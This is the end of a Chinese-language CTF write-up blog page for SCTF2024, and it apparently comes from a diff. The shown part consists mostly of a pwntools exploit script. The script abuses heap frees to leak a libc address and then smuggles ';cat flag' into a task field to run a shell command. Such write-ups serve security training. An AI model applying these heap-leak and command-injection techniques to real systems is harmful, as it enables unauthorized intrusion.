+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;userName&#34;</span>: base64<span style=color:#666>.</span>b64encode(name)<span style=color:#666>.</span>decode(),
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;size&#34;</span>: size,
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> pay
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>show</span>(name, size<span style=color:#666>=</span><span style=color:#666>0</span>):
+</span></span><span style=display:flex><span>    pay <span style=color:#666>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;task_type&#34;</span>: <span style=color:#666>1</span>,
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;username&#34;</span>: base64<span style=color:#666>.</span>b64encode(name)<span style=color:#666>.</span>decode(),
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;size&#34;</span>: size,
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> pay
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>add_wrap</span>(name, content, size):
+</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>sendlineafter(
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;input your tasks&#34;</span>,
+</span></span><span style=display:flex><span>        json<span style=color:#666>.</span>dumps([add(name, content, size)]),
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>delete_wrap</span>(name):
+</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>sendlineafter(
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;input your tasks&#34;</span>,
+</span></span><span style=display:flex><span>        json<span style=color:#666>.</span>dumps([delete(name)]),
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>show_wrap</span>(name):
+</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>sendlineafter(
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;input your tasks&#34;</span>,
+</span></span><span style=display:flex><span>        json<span style=color:#666>.</span>dumps([show(name)]),
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># dbg()</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>for</span> i <span style=color:#a2f;font-weight:700>in</span> <span style=color:#a2f>range</span>(<span style=color:#666>9</span>):
+</span></span><span style=display:flex><span>    add_wrap(<span style=color:#b44>b</span><span style=color:#b44>&#34;qaq&#34;</span>, <span style=color:#b44>b</span><span style=color:#b44>&#34;q&#34;</span> <span style=color:#666>*</span> <span style=color:#666>0x30</span>, <span style=color:#666>0x60</span>) 
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>for</span> i <span style=color:#a2f;font-weight:700>in</span> <span style=color:#a2f>range</span>(<span style=color:#666>9</span>):
+</span></span><span style=display:flex><span>    delete_wrap(<span style=color:#b44>b</span><span style=color:#b44>&#34;qaq&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#触发malloc_consolidate</span>
+</span></span><span style=display:flex><span>add_wrap(<span style=color:#b44>b</span><span style=color:#b44>&#34;qaq&#34;</span>, <span style=color:#b44>b</span><span style=color:#b44>&#34;q&#34;</span> <span style=color:#666>*</span> <span style=color:#666>0x410</span>, <span style=color:#666>0x30</span>)
+</span></span><span style=display:flex><span>add_wrap(<span style=color:#b44>b</span><span style=color:#b44>&#34;target&#34;</span>, <span style=color:#b44>b</span><span style=color:#b44>&#34;q&#34;</span>, <span style=color:#666>0x60</span>)
+</span></span><span style=display:flex><span>show_wrap(<span style=color:#b44>b</span><span style=color:#b44>&#34;target&#34;</span>)
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>&#34;user content:</span><span style=color:#b62;font-weight:700>\n\n</span><span style=color:#b44>&#34;</span>)
+</span></span><span style=display:flex><span>libc<span style=color:#666>.</span>address <span style=color:#666>=</span> u64(p<span style=color:#666>.</span>recv(<span style=color:#666>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#666>8</span>, <span style=color:#b44>b</span><span style=color:#b44>&#34;</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#34;</span>)) <span style=color:#666>-</span> <span style=color:#666>0x1ecc71</span> <span style=color:#080;font-style:italic>#q 0x71</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f>print</span>(<span style=color:#b44>&#34;libc&#34;</span>, <span style=color:#a2f>hex</span>(libc<span style=color:#666>.</span>address))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(
+</span></span><span style=display:flex><span>    <span style=color:#b44>&#34;input your tasks&#34;</span>,
+</span></span><span style=display:flex><span>    json<span style=color:#666>.</span>dumps(
+</span></span><span style=display:flex><span>        [check(<span style=color:#a2f>hex</span>(libc<span style=color:#666>.</span>sym[<span style=color:#b44>&#34;puts&#34;</span>])<span style=color:#666>.</span>encode() <span style=color:#666>+</span> <span style=color:#b44>b</span><span style=color:#b44>&#34;</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#34;</span>, <span style=color:#b44>b</span><span style=color:#b44>&#34;;cat flag&#34;</span>, <span style=color:#666>0x10</span>)] 
+</span></span><span style=display:flex><span>    ),
+</span></span><span style=display:flex><span>)
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div></div><footer class=post-footer><div class=addthis_inline_share_toolbox style=text-align:center></div><hr><div class=reward-container><div><i class="fa-solid fa-mug-hot"></i>请我喝杯咖啡吧 ヾ(^▽^*)))</div><button>
+赞赏</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.png alt="f1ow - 支付宝">
+<span>支付宝</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.png alt="f1ow - 微信">
+<span>微信</span></div></div></div><div class=post-copyright><img src=/imgs/cc/cc.svg width=75 height=75 align=right alt=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
+SCTF2024</li><li class=post-copyright-author><strong>本文作者： </strong>f1ow</li><li class=post-copyright-link><strong>本文链接：</strong>
+<a id=post-cr-link href=https://zp9080.github.io/post/wp%E5%90%88%E9%9B%86/sctf2024/ title=SCTF2024>https://zp9080.github.io/post/wp%E5%90%88%E9%9B%86/sctf2024/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/%E7%AC%94%E8%AE%B0/gzctf%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E8%BF%90%E7%BB%B4/ rel=next title=GZCTF平台搭建运维><i class="fa fa-chevron-left"></i> GZCTF平台搭建运维</a></div><div class="post-nav-prev post-nav-item"><a href=/post/%E7%AC%94%E8%AE%B0/%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/ rel=prev title=内核编译>内核编译
+<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div></main><footer class=footer><div class=footer-inner><div class=copyright>&copy;
+<span itemprop=copyrightYear>2024 - 2025
+</span><span class=with-love><i class="fa fa-heart"></i>
+</span><span class=author itemprop=copyrightHolder>f1ow</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.126.1 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.6.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div><div class=beian><a href=https://beian.miit.gov.cn target=_blank>鄂ICP备 20240001号</a>
+<img src=/imgs/gongan.png alt=鄂公网安备>
+<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42010002002000" target=_blank>鄂公网安备 42010002002000 号</a></div><div class=vendors-list><a target=_blank href=https://vercel.com title=Vercel><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/vercel.svg alt=Vercel>
+</a><a target=_blank href=https://upyun.com title=又拍云><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/upyun.png alt=又拍云>
+</a><a target=_blank href=https://github.com title=Github><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/github.svg alt=Github>
+</a><span>提供CDN/云资源支持</span></div></div></footer><script type=text/javascript src=https://zp9080.github.io/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"https://zp9080.github.io/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"fadeInLeft","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://zp9080.github.io/3rd"}},"version":"4.6.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src=/js/main.min.befa9b7d22ec90da86c74c5dbff5ee42c12e9fc6d6f4448bfcc596cc329b19e8.js defer></script></body></html>
